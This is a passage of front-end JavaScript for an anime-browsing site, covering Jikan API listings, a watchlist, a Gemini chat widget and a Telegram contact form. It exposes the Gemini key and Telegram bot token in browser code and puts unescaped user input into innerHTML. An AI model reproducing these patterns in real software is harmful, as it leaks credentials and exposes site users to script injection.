    suggestionsGrid.innerHTML = '<div class="col-span-full py-20 text-center animate-pulse">Searching...</div>';
    
    searchTimer = setTimeout(async () => {
        try {
            const res = await fetch(`${JIKAN_API}/anime?q=${encodeURIComponent(query)}&limit=20`);
            const data = await res.json();
            
            if (data.data && data.data.length > 0) {
                suggestionsGrid.innerHTML = data.data.map(anime => {
                    const title = getEnglishTitle(anime);
                    return `
                        <div class="anime-card group cursor-pointer" 
                             onclick="openAnimeSelector(${anime.mal_id}, '${title.replace(/'/g, "\\'")}', '${anime.images.jpg.large_image_url}')">
                            <div class="poster-box">
                                <img src="${anime.images.jpg.large_image_url}" alt="${title}">
                            </div>
                            <div class="mt-4 text-center">
                                <h3 class="text-xs font-black dark:text-white uppercase truncate">${title}</h3>

                            </div>
                        </div>
                    `;
                }).join('');
            } else {
                suggestionsGrid.innerHTML = '<div class="col-span-full py-20 text-center text-zinc-500">No results found</div>';
            }
        } catch (error) {
            suggestionsGrid.innerHTML = '<div class="col-span-full py-20 text-center text-red-500">Search failed</div>';
        }
    }, 500);
};

function closeSearch() {
    suggestionsOverlay.style.display = 'none';
    document.body.style.overflow = 'auto';
}

// ==================== DATA LOADING FUNCTIONS ====================

async function loadTrending() {
    const grid = document.getElementById('trendingGrid');
    grid.innerHTML = '<div class="col-span-full py-20 text-center animate-pulse">Loading trending anime...</div>';
    
    try {
        const res = await fetch(`${JIKAN_API}/top/anime?limit=12`);
        
        if (!res.ok) {
            throw new Error(`API responded with status: ${res.status}`);
        }
        
        const data = await res.json();
        
        if (data.data && data.data.length > 0) {
            grid.innerHTML = data.data.map(anime => createAnimeCard(anime, 'trending')).join('');
        } else {
            throw new Error('No data received');
        }
    } catch (error) {
        console.error('Failed to load trending:', error);
        // Try alternative API endpoint
        try {
            const fallbackRes = await fetch(`${JIKAN_API}/anime?order_by=popularity&limit=12`);
            if (fallbackRes.ok) {
                const fallbackData = await fallbackRes.json();
                if (fallbackData.data) {
                    grid.innerHTML = fallbackData.data.map(anime => createAnimeCard(anime, 'trending')).join('');
                    return;
                }
            }
        } catch (fallbackError) {
            console.error('Fallback also failed:', fallbackError);
        }
        
        // If both fail, show error and fallback content
        grid.innerHTML = `
            <div class="col-span-full py-20 text-center">
                <div class="inline-block mb-4">
                    <i class="fas fa-exclamation-triangle text-4xl text-red-500"></i>
                </div>
                <p class="text-red-500 font-bold mb-2">Temporarily Unavailable</p>
                <p class="text-zinc-500 text-sm mb-4">Showing popular anime instead</p>
                <button onclick="loadTrending()" 
                        class="px-4 py-2 bg-brand text-white rounded-lg text-sm font-bold hover:bg-red-600 transition-colors">
                    <i class="fas fa-redo mr-2"></i> Try Again
                </button>
            </div>
        `;
        
        // Load fallback after 2 seconds
        setTimeout(() => {
            const fallbackTrending = getFallbackTrending().slice(0, 6);
            grid.innerHTML = fallbackTrending.map(anime => createAnimeCard(anime, 'trending')).join('');
        }, 2000);
    }
}

async function loadPopularSeries() {
    const grid = document.getElementById('seriesGrid');
    grid.innerHTML = '<div class="col-span-full py-20 text-center animate-pulse">Loading series...</div>';
    
    try {
        const res = await fetch(`${JIKAN_API}/top/anime?limit=18&type=tv`);
        
        if (!res.ok) {
            throw new Error(`API responded with status: ${res.status}`);
        }
        
        const data = await res.json();
        
        if (data.data && data.data.length > 0) {
            grid.innerHTML = data.data.map(anime => createAnimeCard(anime, 'series')).join('');
        } else {
            throw new Error('No data received');
        }
    } catch (error) {
        console.error('Failed to load series:', error);
        
        // Try alternative
        try {
            const fallbackRes = await fetch(`${JIKAN_API}/anime?type=tv&order_by=popularity&limit=18`);
            if (fallbackRes.ok) {
                const fallbackData = await fallbackRes.json();
                if (fallbackData.data) {
                    grid.innerHTML = fallbackData.data.map(anime => createAnimeCard(anime, 'series')).join('');
                    return;
                }
            }
        } catch (fallbackError) {
            console.error('Fallback also failed:', fallbackError);
        }
        
        // Show error and fallback
        grid.innerHTML = `
            <div class="col-span-full py-20 text-center">
                <div class="inline-block mb-4">
                    <i class="fas fa-exclamation-triangle text-4xl text-red-500"></i>
                </div>
                <p class="text-red-500 font-bold mb-2">Temporarily Unavailable</p>
                <p class="text-zinc-500 text-sm mb-4">Showing popular series instead</p>
            </div>
        `;
        
        // Load fallback after 2 seconds
        setTimeout(() => {
            const fallbackSeries = getFallbackSeries();
            grid.innerHTML = fallbackSeries.map(anime => createAnimeCard(anime, 'series')).join('');
        }, 2000);
    }
}

async function loadMovies() {
    const grid = document.getElementById('movieGrid');
    grid.innerHTML = '<div class="col-span-full py-20 text-center animate-pulse">Loading movies...</div>';
    
    try {
        let movieData = null;
        
        try {
            const res1 = await fetch(`${JIKAN_API}/anime?type=movie&order_by=score&sort=desc&limit=6`);
            const data1 = await res1.json();
            if (data1.data && data1.data.length > 0) {
                movieData = data1.data;
            }
        } catch (e) { 
            console.log("Method 1 failed:", e);
        }
        
        if (!movieData || movieData.length === 0) {
            try {
                const res2 = await fetch(`${JIKAN_API}/top/anime?limit=50`);
                const data2 = await res2.json();
                if (data2.data) {
                    movieData = data2.data.filter(anime => 
                        anime.type && anime.type.toLowerCase() === 'movie'
                    ).slice(0, 6);
                }
            } catch (e) { 
                console.log("Method 2 failed:", e);
            }
        }
        
        if (!movieData || movieData.length === 0) {
            try {
                const res3 = await fetch(`${JIKAN_API}/anime?order_by=popularity&limit=20`);
                const data3 = await res3.json();
                if (data3.data) {
                    movieData = data3.data.filter(anime => 
                        anime.type && anime.type.toLowerCase() === 'movie'
                    ).slice(0, 6);
                }
            } catch (e) { 
                console.log("Method 3 failed:", e);
            }
        }
        
        if (!movieData || movieData.length === 0) {
            console.log('Using sample movies data');
            movieData = getSampleMovies();
        }
        
        grid.innerHTML = movieData.map(anime => createMovieCard(anime)).join('');
        
    } catch (error) {
        console.error('Movies loading error:', error);
        const sampleMovies = getSampleMovies();
        grid.innerHTML = sampleMovies.map(anime => createMovieCard(anime)).join('');
    }
}

function getSampleMovies() {
    return [
        {
            mal_id: 32281,
            title: "Kimi no Na wa.",
            title_english: "Your Name",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/5/87048.jpg",
                    image_url: "https://cdn.myanimelist.net/images/anime/5/87048.jpg"
                } 
            },
            score: 8.85,
            year: 2016,
            type: "Movie"
        },
        {
            mal_id: 37987,
            title: "Koe no Katachi",
            title_english: "A Silent Voice",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/1122/96435.jpg",
                    image_url: "https://cdn.myanimelist.net/images/anime/1122/96435.jpg"
                } 
            },
            score: 8.94,
            year: 2016,
            type: "Movie"
        },
        {
            mal_id: 28851,
            title: "Kaguya-hime no Monogatari",
            title_english: "The Tale of the Princess Kaguya",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/5/65929.jpg",
                    image_url: "https://cdn.myanimelist.net/images/anime/5/65929.jpg"
                } 
            },
            score: 8.52,
            year: 2013,
            type: "Movie"
        },
        {
            mal_id: 19815,
            title: "No Game No Life: Zero",
            title_english: "No Game No Life Zero",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/1084/92371.jpg",
                    image_url: "https://cdn.myanimelist.net/images/anime/1084/92371.jpg"
                } 
            },
            score: 8.47,
            year: 2017,
            type: "Movie"
        },
        {
            mal_id: 38408,
            title: "Fate/stay night Movie: Heaven's Feel - III. Spring Song",
            title_english: "Fate/stay night: Heaven's Feel - III. Spring Song",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/1142/105957.jpg",
                    image_url: "https://cdn.myanimelist.net/images/anime/1142/105957.jpg"
                } 
            },
            score: 8.65,
            year: 2020,
            type: "Movie"
        },
        {
            mal_id: 27947,
            title: "Gekijouban Jujutsu Kaisen 0",
            title_english: "Jujutsu Kaisen 0",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/1813/119718.jpg",
                    image_url: "https://cdn.myanimelist.net/images/anime/1813/119718.jpg"
                } 
            },
            score: 8.67,
            year: 2021,
            type: "Movie"
        }
    ];
}

// ==================== ANIME CARD CREATION ====================
// ==================== ANIME CARD CREATION ====================
function createAnimeCard(anime, type) {
    const title = getEnglishTitle(anime);
    const score = anime.score ? `${anime.score.toFixed(1)}⭐` : 'N/A';
    const imageUrl = anime.images?.jpg?.large_image_url || 
                     'https://via.placeholder.com/400x600/1a1a2e/ffffff?text=Anime';
    
    return `
        <div class="anime-card group cursor-pointer" 
             onclick="openAnimeSelector(${anime.mal_id}, '${title.replace(/'/g, "\\'")}', '${imageUrl}')">
            <div class="poster-box">
                <img src="${imageUrl}" alt="${title}" 
                     onerror="this.src='https://via.placeholder.com/400x600/1a1a2e/ffffff?text=Anime'">
                <!-- Rating Badge -->
                <div class="rating-badge">
                    <span class="rating-score">${score}</span>
                </div>
            </div>
            <div class="mt-4 text-center">
                <h3 class="text-xs font-black dark:text-white uppercase truncate">${title}</h3>
                <p class="text-[10px] text-zinc-500 mt-1">${anime.type} • ${score}</p>
            </div>
        </div>
    `;
}

function createMovieCard(anime) {
    const title = anime.title_english || anime.title || 'Anime Movie';
    const score = anime.score ? `${anime.score.toFixed(1)}⭐` : '';
    const year = anime.year || anime.aired?.prop?.from?.year || '';
    const imageUrl = anime.images?.jpg?.large_image_url || 
                     anime.images?.jpg?.image_url || 
                     'https://via.placeholder.com/600x400/1a1a2e/ffffff?text=Movie';
    
    return `
        <div class="group cursor-pointer reveal active" 
             onclick="openAnimeSelector(${anime.mal_id}, '${title.replace(/'/g, "\\'")}', '${imageUrl}')">
            <div class="relative rounded-3xl overflow-hidden aspect-video bg-zinc-900 border dark:border-zinc-800 shadow-2xl group">
                <img src="${imageUrl}" 
                     alt="${title}"
                     class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700"
                     onerror="this.src='https://via.placeholder.com/600x400/1a1a2e/ffffff?text=Movie'">
                <!-- Movie Rating Badge -->
                <div class="absolute top-4 left-4 rating-badge-movie">
                    <span class="rating-score-movie">${score || 'N/A'}</span>
                </div>
                <div class="absolute inset-0 bg-gradient-to-t from-zincDark via-transparent to-transparent p-6 flex flex-col justify-end">
                    <div class="flex items-center gap-2 mb-2">
                        <span class="bg-brand text-white px-3 py-1 rounded-lg text-[10px] font-bold">MOVIE</span>
                        ${score ? `<span class="text-accent text-sm font-bold">${score}</span>` : ''}
                    </div>
                    <h3 class="text-xl md:text-3xl font-black text-white group-hover:text-accent transition-colors uppercase italic leading-tight">
                        ${title}
                    </h3>
                    ${year ? `<p class="text-zinc-300 text-xs mt-2">${year}</p>` : ''}
                </div>
            </div>
        </div>
    `;
}
// ==================== WATCHLIST FUNCTIONS ====================

function toggleWatchlist(item) {
    const index = watchlist.findIndex(w => w.id === item.id);
    
    if (index === -1) {
        watchlist.push({
            ...item,
            addedAt: new Date().toISOString()
        });
        showToast('Added to Watchlist! ✅', true);
    } else {
        watchlist.splice(index, 1);
        showToast('Removed from Watchlist', false);
    }
    
    localStorage.setItem('frontier_watchlist_pro', JSON.stringify(watchlist));
    renderWatchlist();
    return index === -1;
}

function renderWatchlist() {
    const grid = document.getElementById('watchlistGrid');
    const section = document.getElementById('watchlistSection');
    
    if (watchlist.length === 0) {
        grid.innerHTML = `
            <div class="col-span-full watchlist-empty">
                <i class="fas fa-bookmark text-5xl text-zinc-400 mb-4"></i>
                <h3 class="text-xl font-black text-zinc-400 mb-2">Watchlist Empty</h3>
                <p class="text-zinc-500">Add anime to your watchlist</p>
            </div>
        `;
        section.classList.add('hidden');
    } else {
        grid.innerHTML = watchlist.map(item => `
            <div class="anime-card group">
                <div class="poster-box relative">
                    <img src="${item.img}" alt="${item.title}">
                    <button class="watchlist-badge added"
                            onclick="toggleWatchlist(${JSON.stringify(item)})">
                        <i class="fas fa-check"></i>
                    </button>
                </div>
                <div class="mt-4">
                    <h3 class="text-sm font-black truncate">${item.title}</h3>
                    <div class="flex gap-2 mt-2">
                        <button onclick="openAnimeSelector(${item.id}, '${item.title.replace(/'/g, "\\'")}', '${item.img}')"
                                class="flex-1 bg-brand text-white py-2 rounded-lg text-xs font-bold">
                            Watch
                        </button>
                        <button onclick="openInfoPage(${item.id}, '${item.title.replace(/'/g, "\\'")}')"
                                class="flex-1 bg-zinc-100 dark:bg-zinc-800 py-2 rounded-lg text-xs font-bold">
                            Info
                        </button>
                    </div>
                </div>
            </div>
        `).join('');
        section.classList.remove('hidden');
    }
}

// ==================== UTILITY FUNCTIONS ====================

function getEnglishTitle(anime) {
    const englishMap = {
        'Kimetsu no Yaiba': 'Demon Slayer',
        'Boku no Hero Academia': 'My Hero Academia',
        'Shingeki no Kyojin': 'Attack on Titan',
        'Naruto': 'Naruto',
        'Jujutsu Kaisen': 'Jujutsu Kaisen',
        'Solo Leveling': 'Solo Leveling',
        'Dragon Ball Z': 'Dragon Ball Z',
        'One Piece': 'One Piece',
        'Death Note': 'Death Note',
        'Fullmetal Alchemist: Brotherhood': 'Fullmetal Alchemist',
        'Hunter x Hunter': 'Hunter x Hunter',
        'Tokyo Ghoul': 'Tokyo Ghoul',
        'ワンピース': 'One Piece',
        'ナルト': 'Naruto',
        'ドラゴンボールZ': 'Dragon Ball Z',
        '鬼滅の刃': 'Demon Slayer',
        '呪術廻戦': 'Jujutsu Kaisen',
        '僕のヒーローアカデミア': 'My Hero Academia',
        '進撃の巨人': 'Attack on Titan'
    };
    
    let title = anime.title || '';
    
    // Check exact match first
    for (const [jp, en] of Object.entries(englishMap)) {
        if (title === jp || title.includes(jp)) {
            return en;
        }
    }
    
    // Check Japanese title
    if (anime.title_japanese) {
        for (const [jp, en] of Object.entries(englishMap)) {
            if (anime.title_japanese.includes(jp)) {
                return en;
            }
        }
    }
    
    // Return English title if available
    if (anime.title_english && anime.title_english.trim()) {
        return anime.title_english;
    }
    
    // Fallback to main title
    return title;
}

function showToast(message, isSuccess = true) {
    const toast = document.createElement('div');
    toast.className = `toast ${isSuccess ? 'bg-green-500' : 'bg-red-500'}`;
    toast.innerHTML = `
        <div class="flex items-center gap-2">
            <i class="fas ${isSuccess ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
            <span>${message}</span>
        </div>
    `;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 2000);
}

// ==================== AI CHAT FUNCTIONS ====================

function toggleAIChat() { 
    document.getElementById('aiChatWindow').classList.toggle('open'); 
}

async function askAI() {
    const input = document.getElementById('aiInput');
    const q = input.value.trim(); 
    if (!q) return; 
    input.value = '';

    const box = document.getElementById('chatMessages');
    box.innerHTML += `<div class="p-3 bg-brand text-white rounded-2xl ml-auto max-w-[85%] mb-2">${q}</div>`;
    
    const loader = document.createElement('div');
    loader.className = "p-3 bg-zinc-100 dark:bg-zinc-800 rounded-2xl mr-auto max-w-[85%] mb-2 animate-pulse";
    loader.innerText = "..."; 
    box.appendChild(loader); 
    box.scrollTop = box.scrollHeight;

    try {
        // **Intent Detection for Developer/Admin/Creator Questions**
        const developerQueries = [
            "developer", "admin", "creator", "owner", 
            "who built you", "your developer", "your admin",
            "your creator", "your owner"
        ];
        if (developerQueries.some(keyword => q.toLowerCase().includes(keyword))) {
            loader.innerText = "I was designed and developed by Aryan🔥. He is skilled and passionate about AI.He focuses on making me helpful and reliable😊.";
            loader.classList.remove('animate-pulse');
            box.scrollTop = box.scrollHeight;
            return; // Early exit, no API call needed
        }

        // **Call API for General Queries**
        const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${GEMINI_KEY}`, { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ 
                contents: [{ parts: [{ text: q }] }], 
                systemInstruction: { parts: [{ text: "Brief Hinglish mix." }] } 
            }) 
        });
        
        const d = await res.json(); 
        loader.innerText = d.candidates[0].content.parts[0].text;
        loader.classList.remove('animate-pulse');
    } catch (e) { 
        loader.innerText = "AI Signal weak."; 
    }
    
    box.scrollTop = box.scrollHeight;
}

// ==================== TELEGRAM FORM ====================

document.getElementById('tgContactForm').onsubmit = async (e) => {
    e.preventDefault();
    const btn = document.getElementById('formSubmitBtn');
    btn.innerText = "Transmitting...";
    
    const res = await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify({ 
            chat_id: tgId, 
            text: `<b>New Elite Submission</b>\n👤 ${document.getElementById('formName').value}\n📧 ${document.getElementById('formEmail').value}\n📝 ${document.getElementById('formMessage').value}`, 
            parse_mode: 'HTML' 
        }) 
    });
    
    btn.innerText = "Send Message";
    if(res.ok) { 
        e.target.reset(); 
        alert("Transmitted via Telegram."); 
    }
};

// ==================== THEME TOGGLE ====================

function initThemeToggle() {
    const themeToggle = document.getElementById('themeToggle');
    const themeIcon = document.getElementById('themeIcon');
    
    // Check saved theme
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'dark' || (!savedTheme && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
        document.documentElement.classList.add('dark');
        themeIcon.className = 'fas fa-sun';
    } else {
        themeIcon.className = 'fas fa-moon';
    }
    
    themeToggle.onclick = () => {
        const isDark = document.documentElement.classList.toggle('dark');
        themeIcon.className = isDark ? 'fas fa-sun' : 'fas fa-moon';
        localStorage.setItem('theme', isDark ? 'dark' : 'light');
    };
}

// ==================== ADDITIONAL HELPER FUNCTIONS ====================

// Function to ensure episode image
function getEpisodeImage(episode, mainImage) {
    if (!episode.images || !episode.images.jpg || !episode.images.jpg.image_url) {
        return mainImage;
    }
    
    const imgUrl = episode.images.jpg.image_url;
    if (imgUrl.includes('default.jpg') || imgUrl.includes('questionmark')) {
        return mainImage;
    }
    
    return imgUrl;
}

// Function to clean episode data
function cleanEpisodeData(episode, title, index) {
    return {
        mal_id: episode.mal_id || episode.id || index + 1,
        title: episode.title || generateEpisodeTitle(title, episode.episode || index + 1),
        episode: episode.episode || episode.number || index + 1,
        images: {
            jpg: {
                image_url: getEpisodeImage(episode, mainAnimeImage)
            }
        }
    };
}

// Function to get safe title for onclick
function getSafeTitle(title) {
    if (!title) return 'Episode';
    return title.replace(/'/g, "\\'")
                .replace(/undefined/gi, '')
                .replace(/\s+/g, ' ')
                .trim();
}
// Is code ko script.js ke start mein add karo (window.onload se pehle)
(function() {
    let canExit = false;
    
    // Hardware back button handle
    window.addEventListener('popstate', function(e) {
        if (!canExit) {
            // Check for open overlays
            const overlays = [
                document.getElementById('infoPageOverlay'),
                document.getElementById('selectorModal'),
                document.getElementById('trailerModal'),
                document.getElementById('episodePlayerModal'),
                document.getElementById('loginModal')
            ];
            
            let hasOpenOverlay = false;
            
            overlays.forEach(overlay => {
                if (overlay && 
                    (overlay.style.display === 'block' || 
                     !overlay.classList.contains('hidden'))) {
                    hasOpenOverlay = true;
                }
            });
            
            if (hasOpenOverlay) {
                // Overlay close karo
                closeAllOverlays();
                // History mein wapas jao
                window.history.pushState(null, '', window.location.pathname);
            } else {
                // Confirm exit
                if (confirm('Press back again to exit')) {
                    canExit = true;
                    setTimeout(() => { canExit = false; }, 2000);
                    window.history.back();
                } else {
                    window.history.pushState(null, '', window.location.pathname);
                }
            }
        }
    });
    
    function closeAllOverlays() {
        document.getElementById('infoPageOverlay').style.display = 'none';
        document.getElementById('selectorModal').classList.add('hidden');
        document.getElementById('trailerModal').classList.add('hidden');
        document.getElementById('episodePlayerModal').classList.add('hidden');
        document.body.classList.remove('modal-open');
        document.documentElement.style.overflow = 'auto';
    }
    
    // Initial state push
    window.history.replaceState(null, '', window.location.pathname);
})();

// ==================== INITIALIZATION ====================

// Add to window.onload function
window.onload = async () => {
    // Initialize theme toggle
    initThemeToggle();
    
    // Initialize user system
    initializeUserSystem();
    
    // Add popstate listener for back button - IMPORTANT
    window.addEventListener('popstate', handlePopState);
    
    // Check if we should open info/episodes page from URL on load
    if (window.location.hash.includes('info-') || window.location.hash.includes('episodes-')) {
        const match = window.location.hash.match(/(info|episodes)-(\d+)/);
        if (match) {
            const type = match[1];
            const animeId = parseInt(match[2]);
            
            // You might want to automatically open the page based on URL
            // For now, just clear invalid hashes
            if (!animeId) {
                window.history.replaceState(null, '', window.location.pathname);
            }
        }
    }

    // Load hero banners first
    await loadHeroBanners();
    
    // **CHANGED: Sequential loading with delays to avoid API rate limit**
    try {
        // Load trending with delay
        await loadTrending();
        
        // Add delay between requests
        await delay(1000);
        
        // Load popular series
        await loadPopularSeries();
        
        // Add delay
        await delay(1000);
        
        // Load movies
        await loadMovies();
        
    } catch (error) {
        console.error('Error loading sections:', error);
        // Show fallback content if API fails
        loadFallbackContent();
    }
    
    // Initialize watchlist
    renderWatchlist();
    
    // Start hero auto-slide
    startHeroAutoSlide();
    
    // AI input enter key
    document.getElementById('aiInput').onkeypress = (e) => { 
        if (e.key === 'Enter') askAI(); 
    };
};

// **ADD THIS HELPER FUNCTION**
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// **ADD FALLBACK CONTENT FUNCTION**
function loadFallbackContent() {
    console.log('Loading fallback content...');
    
    // Fallback trending anime
    const fallbackTrending = getFallbackTrending();
    document.getElementById('trendingGrid').innerHTML = fallbackTrending.map(anime => 
        createAnimeCard(anime, 'trending')
    ).join('');
    
    // Fallback series
    const fallbackSeries = getFallbackSeries();
    document.getElementById('seriesGrid').innerHTML = fallbackSeries.map(anime => 
        createAnimeCard(anime, 'series')
    ).join('');
    
    // Fallback movies (use existing function)
    const fallbackMovies = getSampleMovies();
    document.getElementById('movieGrid').innerHTML = fallbackMovies.map(anime => 
        createMovieCard(anime)
    ).join('');
}

// **ADD FALLBACK ANIME DATA FUNCTIONS**
function getFallbackTrending() {
    return [
        {
            mal_id: 51009,
            title: "Jujutsu Kaisen 2nd Season",
            title_english: "Jujutsu Kaisen Season 2",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/1792/138022.jpg"
                } 
            },
            score: 8.67,
            type: "TV",
            episodes: 23
        },
        {
            mal_id: 52991,
            title: "Sousou no Frieren",
            title_english: "Frieren: Beyond Journey's End",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/1015/138006.jpg"
                } 
            },
            score: 9.37,
            type: "TV",
            episodes: 28
        },
        {
            mal_id: 51180,
            title: "Fullmetal Alchemist: Brotherhood",
            title_english: "Fullmetal Alchemist: Brotherhood",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/1208/94745.jpg"
                } 
            },
            score: 9.09,
            type: "TV",
            episodes: 64
        },
        {
            mal_id: 1,
            title: "Cowboy Bebop",
            title_english: "Cowboy Bebop",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/4/19644.jpg"
                } 
            },
            score: 8.78,
            type: "TV",
            episodes: 26
        },
        {
            mal_id: 1535,
            title: "Death Note",
            title_english: "Death Note",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/9/9453.jpg"
                } 
            },
            score: 8.63,
            type: "TV",
            episodes: 37
        },
        {
            mal_id: 1575,
            title: "Code Geass: Hangyaku no Lelouch",
            title_english: "Code Geass: Lelouch of the Rebellion",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/5/50331.jpg"
                } 
            },
            score: 8.71,
            type: "TV",
            episodes: 25
        }
    ];
}

function getFallbackSeries() {
    return [
        {
            mal_id: 20,
            title: "Naruto",
            title_english: "Naruto",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/13/17405.jpg"
                } 
            },
            score: 7.99,
            type: "TV",
            episodes: 220
        },
        {
            mal_id: 21,
            title: "One Piece",
            title_english: "One Piece",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/6/73245.jpg"
                } 
            },
            score: 8.71,
            type: "TV",
            episodes: 1100
        },
        {
            mal_id: 31964,
            title: "Boku no Hero Academia",
            title_english: "My Hero Academia",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/10/78745.jpg"
                } 
            },
            score: 7.99,
            type: "TV",
            episodes: 138
        },
        {
            mal_id: 16498,
            title: "Shingeki no Kyojin",
            title_english: "Attack on Titan",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/10/47347.jpg"
                } 
            },
            score: 8.54,
            type: "TV",
            episodes: 75
        },
        {
            mal_id: 11061,
            title: "Hunter x Hunter",
            title_english: "Hunter x Hunter",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/11/33657.jpg"
                } 
            },
            score: 9.10,
            type: "TV",
            episodes: 148
        },
        {
            mal_id: 13601,
            title: "Psycho-Pass",
            title_english: "Psycho-Pass",
            images: { 
                jpg: { 
                    large_image_url: "https://cdn.myanimelist.net/images/anime/5/43399.jpg"
                } 
            },
            score: 8.41,
            type: "TV",
            episodes: 22
        }
    ];
}
// Add this function to clean all titles before displaying
function formatDisplayTitle(title) {
    if (!title) return 'Episode';
    
    // Remove any undefined text
    let formatted = title.replace(/undefined/gi, '')
                         .replace(/\s*-\s*$/g, '')
                         .replace(/^\s*-\s*/g, '')
                         .replace(/\s+/g, ' ')
                         .trim();
    
    // Capitalize first letter of each word
    formatted = formatted.toLowerCase()
        .split(' ')
        .map(word => word.charAt(0).toUpperCase() + word.slice(1))
        .join(' ');
    
    // If still empty, return generic title
    if (!formatted || formatted === '' || formatted === '-') {
        return 'Episode';
    }
    
    return formatted;
}

// Update the getSafeTitle function to use formatDisplayTitle
function getSafeTitle(title) {
    const formatted = formatDisplayTitle(title);
    return formatted.replace(/'/g, "\\'")
                    .replace(/"/g, '\\"')
                    .replace(/\n/g, ' ')
                    .trim();
}

// Update cleanEpisodeTitle to use formatDisplayTitle
function cleanEpisodeTitle(title) {
    return formatDisplayTitle(title);
}

// Add this function to handle API rate limiting better
async function fetchWithRetry(url, retries = 3, delayMs = 1000) {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await fetch(url);
            if (response.ok) {
                return await response.json();
            }
            if (response.status === 429) { // Rate limit
                console.log(`Rate limited, retrying in ${delayMs}ms...`);
                await new Promise(resolve => setTimeout(resolve, delayMs));
                delayMs *= 2; // Exponential backoff
                continue;
            }
            throw new Error(`HTTP ${response.status}`);
        } catch (error) {
            if (i === retries - 1) throw error;
            console.log(`Attempt ${i + 1} failed, retrying...`);
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
    }
}

// Update loadTrending function to use fetchWithRetry
async function loadTrending() {
    const grid = document.getElementById('trendingGrid');
    grid.innerHTML = '<div class="col-span-full py-20 text-center animate-pulse">Loading trending anime...</div>';
    
    try {
        const data = await fetchWithRetry(`${JIKAN_API}/top/anime?limit=12`, 2, 1000);
        
        if (data.data && data.data.length > 0) {
            grid.innerHTML = data.data.map(anime => createAnimeCard(anime, 'trending')).join('');
        } else {
            throw new Error('No data received');
        }
    } catch (error) {
        console.error('All attempts failed:', error);
        // Show fallback content
        const fallbackTrending = getFallbackTrending();
        grid.innerHTML = fallbackTrending.map(anime => createAnimeCard(anime, 'trending')).join('');
    }
}
// Add this helper function to handle episode numbering correctly
function createSeasonsFromEpisodes(episodes, episodesPerSeason = 12, title = '', mainImage = '') {
    const seasons = [];
    
    if (!episodes || episodes.length === 0) {
        // Create dummy seasons with proper numbering
        const totalEpisodes = 24; // Default
        const seasonCount = Math.ceil(totalEpisodes / episodesPerSeason);
        
        for (let seasonNum = 1; seasonNum <= seasonCount; seasonNum++) {
            const startEp = (seasonNum - 1) * episodesPerSeason + 1;
            const endEp = Math.min(seasonNum * episodesPerSeason, totalEpisodes);
            
            const seasonEpisodes = [];
            for (let epNum = startEp; epNum <= endEp; epNum++) {
                seasonEpisodes.push({
                    mal_id: epNum,
                    title: generateEpisodeTitle(title, epNum),
                    episode: epNum, // Correct episode number
                    images: {
                        jpg: {
                            image_url: mainImage
                        }
                    }
                });
            }
            
            seasons.push({
                number: seasonNum,
                episodes: seasonEpisodes,
                title: `Season ${seasonNum}`,
                episodeCount: seasonEpisodes.length,
                startEpisode: startEp,
                endEpisode: endEp
            });
        }
    } else {
        // Process actual episodes from API
        const seasonCount = Math.ceil(episodes.length / episodesPerSeason);
        
        for (let seasonNum = 1; seasonNum <= seasonCount; seasonNum++) {
            const startIndex = (seasonNum - 1) * episodesPerSeason;
            const endIndex = Math.min(seasonNum * episodesPerSeason, episodes.length);
            const seasonEpisodes = episodes.slice(startIndex, endIndex);
            
            // Preserve original episode numbers
            const startEpisode = seasonEpisodes[0]?.episode || (startIndex + 1);
            
            seasons.push({
                number: seasonNum,
                episodes: seasonEpisodes,
                title: `Season ${seasonNum}`,
                episodeCount: seasonEpisodes.length,
                startEpisode: startEpisode
            });
        }
    }
    
    return seasons;
}
// SEARCH ICON TOGGLE
const searchIconBtn = document.getElementById("searchIconBtn");
const searchBox = document.getElementById("searchBox");
const animeSearch = document.getElementById("animeSearch");

searchIconBtn.addEventListener("click", (e) => {
  e.stopPropagation();
  searchBox.classList.toggle("hidden");
  animeSearch.focus();
});

// Close search when clicking outside
document.addEventListener("click", (e) => {
  if (!document.getElementById("searchWrapper").contains(e.target)) {
    searchBox.classList.add("hidden");
  }
});

// Initialize user system
function initializeUserSystem() {
    // Check login status ONLY after animation is done
    if (sessionStorage.getItem("af_animation_done")) {
        console.log("Initializing user system after animation...");
        checkLoginStatus();
    } else {
        console.log("Waiting for animation to complete...");
        // Wait for animation to complete, then check login
        const checkAnimationInterval = setInterval(() => {
            if (sessionStorage.getItem("af_animation_done")) {
                clearInterval(checkAnimationInterval);
